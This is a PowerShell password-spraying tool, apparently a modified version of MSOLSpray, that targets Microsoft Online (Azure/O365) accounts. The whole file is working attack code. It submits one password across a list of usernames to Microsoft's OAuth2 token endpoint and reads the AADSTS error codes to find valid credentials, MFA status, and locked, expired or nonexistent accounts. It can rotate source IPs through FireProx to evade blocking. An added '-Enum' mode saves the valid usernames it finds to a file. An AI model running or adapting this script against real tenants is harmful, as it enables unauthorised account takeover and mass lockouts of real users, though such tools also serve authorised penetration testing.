function Invoke-MSOLSpray{

<#
    .SYNOPSIS
		This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
		MSOLSpray Function: Invoke-MSOLSpray
		Author: Beau Bullock (@dafthack)
		License: BSD 3-Clause
		Required Dependencies: None
		Optional Dependencies: None
			
		This modification allows MSOLSpray to conveniently be used for identifying valid usernames collected during the reconnaissance phase.

		Simply use the '-Enum' option and once the tool completes its execution, the tool will print "Valid usernames saved to Valid-Usernames.txt" and the file 'Valid-Usernames.txt' will appear in the same location where you ran this tool.

		The '-Enum' option adds users to the Valid-Usernames.txt file that meet any one of the following criteria: 
			- Valid Credentials
			- Invalid Password but Valid Username
			- Valid Credentials but MFA in use
			- Locked Accounts
			- Account with Expired Passwords

		Modifications to original script are marked with '#Enum' - P4N1K
			
    .DESCRIPTION
        
        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.        
    
    .PARAMETER UserList
        
        UserList file filled with usernames one-per-line in the format "user@domain.com"
    
    .PARAMETER Password
        
        A single password that will be used to perform the password spray.
    
    .PARAMETER OutFile
        
        A file to output valid results to.
    
    .PARAMETER Force
        
        Forces the spray to continue and not stop when multiple account lockouts are detected.
    
    .PARAMETER URL
        
        The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
    
    .PARAMETER Enum
        Optional flag to enumerate and output valid usernames to a file.
			
    .EXAMPLE
        
        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
        Description
        -----------
        This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    
    .EXAMPLE
        
        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password P@ssword -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox -OutFile valid-users.txt
        Description
        -----------
        This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    #>

    Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [string]$OutFile = "",

        [Parameter(Position = 1, Mandatory = $False)]
        [string]$UserList = "",

        [Parameter(Position = 2, Mandatory = $False)]
        [string]$Password = "",

        [Parameter(Position = 3, Mandatory = $False)]
        [string]$URL = "https://login.microsoft.com",

        [Parameter(Position = 4, Mandatory = $False)]
        [switch]$Force,

        [Parameter(Position = 5, Mandatory = $False)]
        [switch]$Enum  #Enum - Added parameter to enable valid users enumeration
    )

    $ErrorActionPreference= 'silentlycontinue'
    $Usernames = Get-Content $UserList
    $count = $Usernames.count
    $curr_user = 0
    $lockout_count = 0
    $lockoutquestion = 0
    $fullresults = @()
    $validUsers = @()  #Enum - Initialized array to hold valid users, including locked accounts

    Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
    Write-Host -ForegroundColor "yellow" "[*] Now spraying Microsoft Online."
    $currenttime = Get-Date
    Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"

    ForEach ($username in $usernames) {

        # User counter
        $curr_user += 1
        Write-Host -nonewline "$curr_user of $count users tested`r"

        # Setting up the web request
        $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894'; 'client_info' = '1'; 'grant_type' = 'password'; 'username' = $username; 'password' = $password; 'scope' = 'openid'}
        $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded'}
        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

        # If we get a 200 response code, it's a valid credential
        If ($webrequest.StatusCode -eq "200") {
            Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password"
            $webrequest = ""
            $fullresults += "$username : $password"

            #Enum - Add the valid user to the $validUsers array if the -Enum flag is set
            if ($Enum) {
                $validUsers += "$username"  #Enum - Valid user found
            }
        }
        else {
            # Handle responses based on error codes
            if ($RespErr -match "AADSTS50126") {  #Enum - Error code states invalid password but valid username
                
				#Enum - Add the valid user to the $validUsers array if the -Enum flag is set
				if ($Enum) {
					$validUsers += "$username"  #Enum - Valid user found (username is valid, even though password is incorrect)
				}
				
			continue
            }
            elseif ($RespErr -match "AADSTS50128" -or $RespErr -match "AADSTS50059") {  # Invalid Tenant
                Write-Output "[*] WARNING! Tenant for account $username doesn't exist."
            }
            elseif ($RespErr -match "AADSTS50034") {  # Invalid Username
                Write-Output "[*] WARNING! The user $username doesn't exist."
            }
            elseif ($RespErr -match "AADSTS50079" -or $RespErr -match "AADSTS50076") {  # MFA Required
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - MFA in use."
                $fullresults += "$username : $password"

                #Enum - Add the MFA-enabled user to the $validUsers array if -Enum is used
                if ($Enum) {
                    $validUsers += "$username"  #Enum - MFA enabled valid user
                }
            }
            elseif ($RespErr -match "AADSTS50053") {  # Account Locked
                Write-Output "[*] WARNING! The account $username appears to be locked."
                $lockout_count++

                #Enum - Add locked accounts to the valid users list if -Enum is used
                if ($Enum) {
                    $validUsers += "$username"  #Enum - Locked account treated as valid user
                }
            }
            elseif ($RespErr -match "AADSTS50057") {  # Disabled Account
                Write-Output "[*] WARNING! The account $username appears to be disabled."
            }
            elseif ($RespErr -match "AADSTS50055") {  # Password Expired
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - Password expired."
                $fullresults += "$username : $password"

                #Enum - Add password expired valid user to the list
                if ($Enum) {
                    $validUsers += "$username"  #Enum - Expired password valid user
                }
            }
            else {
                Write-Output "[*] Got an unknown error for user $username"
            }
        }

        # Handle multiple lockout warnings if -Force is not used
        if (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0) {
            $title = "WARNING! Multiple Account Lockouts Detected!"
            $message = "10 accounts appear to be locked out. Do you want to continue spraying?"
            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", "Continue spraying."
            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", "Cancel the spray."
            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
            $lockoutquestion++
            if ($result -ne 0) {
                Write-Host "[*] Cancelling the password spray."
                break
            }
        }
    }

    # Output results to file
    if ($OutFile -ne "") {
        if ($fullresults) {
            $fullresults | Out-File -Encoding ascii $OutFile
            Write-Output "Results have been written to $OutFile."
        }
    }

    #Enum - Output valid users if the -Enum flag is used and valid users were found
	if ($Enum -and $validUsers.Count -gt 0) {
    #Enum - Write valid users to file without trailing newline
    for ($i = 0; $i -lt $validUsers.Count; $i++) {
        if ($i -eq ($validUsers.Count - 1)) {
            #Enum - Write the last user without a newline
            Add-Content -Path "Valid-Usernames.txt" -Value $validUsers[$i] -NoNewline
        } else {
            #Enum - Write other users with a newline
            Add-Content -Path "Valid-Usernames.txt" -Value "$($validUsers[$i])"
        }
    }

    Write-Host "Valid usernames saved to Valid-Usernames.txt"  #Enum - Output message
	}
}
